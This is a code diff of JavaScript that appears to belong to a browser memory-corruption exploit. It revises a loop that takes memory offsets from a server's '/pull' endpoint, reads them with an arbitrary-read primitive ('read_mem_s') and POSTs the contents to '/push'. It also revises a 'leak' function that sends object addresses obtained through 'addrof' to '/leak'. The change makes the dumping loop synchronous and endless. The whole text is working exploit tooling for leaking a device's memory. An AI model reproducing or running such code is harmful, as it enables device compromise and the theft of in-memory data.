@@ -1,10 +1,17 @@
 function query()
 {
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', '/pull', true);
-    xhr.onerror = query.bind(window);
-    xhr.onload = function()
+    for(;;)
     {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/pull', false);
+        try
+        {
+            xhr.send('');
+        }
+        catch(e)
+        {
+            continue;
+        }
         try
         {
             try
@@ -13,11 +20,11 @@ function query()
             }
             catch(e)
             {
-                return query();
+                continue;
             }
             if(data !== null)
             {
-                var m = read_mem_b(data.offset, data.size);
+                var m = read_mem_s(data.offset, data.size);
                 var xhr2 = new XMLHttpRequest();
                 xhr2.open('POST', '/push', false);
                 xhr2.send(m);
@@ -27,16 +34,14 @@ function query()
         {
             document.body.innerHTML += e;
         }
-        query();
     }
-    xhr.send('');
 }
 
 function leak(obj)
 {
     var addr = addrof(obj);
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', '/leak', true);
+    xhr.open('POST', '/leak', false);
     xhr.send(hex(addr));
 }
 
